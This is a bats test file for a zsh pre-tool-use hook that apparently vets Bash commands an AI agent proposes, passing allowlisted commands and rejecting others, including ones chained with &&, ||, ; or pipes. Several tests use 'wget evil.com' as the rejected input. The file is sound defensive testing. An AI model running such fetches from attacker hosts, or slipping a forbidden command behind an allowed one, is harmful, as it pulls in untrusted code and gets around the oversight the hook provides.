bats_load_library 'helper'

setup() {
  bats_tmp_dir
  sourcePrefix="hookDir='${BATS_TEST_DIRNAME}/..'; source '${BATS_TEST_DIRNAME}/../preToolUse-Bash-solkan.zsh'"
}

@test "exits 0 for an allowlisted simple command" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status'"
  [ "$status" -eq 0 ]
}

@test "exits 1 for a non-allowlisted simple command" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'wget evil.com'"
  [ "$status" -eq 1 ]
}

@test "exits 0 for && compound where all subcommands are allowlisted" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status && git log --oneline'"
  [ "$status" -eq 0 ]
}

@test "exits 1 for && compound with one non-allowlisted subcommand" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status && wget evil.com'"
  [ "$status" -eq 1 ]
}

@test "exits 0 for || compound where all subcommands are allowlisted" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status || echo fallback'"
  [ "$status" -eq 0 ]
}

@test "exits 1 for || compound with one non-allowlisted subcommand" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status || wget evil.com'"
  [ "$status" -eq 1 ]
}

@test "exits 0 for ; compound where all subcommands are allowlisted" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status; echo done'"
  [ "$status" -eq 0 ]
}

@test "exits 1 for ; compound with one non-allowlisted subcommand" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status; wget evil.com'"
  [ "$status" -eq 1 ]
}

@test "exits 0 for pipe where all subcommands are allowlisted" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status | grep branch'"
  [ "$status" -eq 0 ]
}

@test "exits 1 for pipe with one non-allowlisted subcommand" {
  bats_run_zsh "${sourcePrefix}; preToolUse-Bash-solkan 'git status | wget evil.com'"
  [ "$status" -eq 1 ]
}
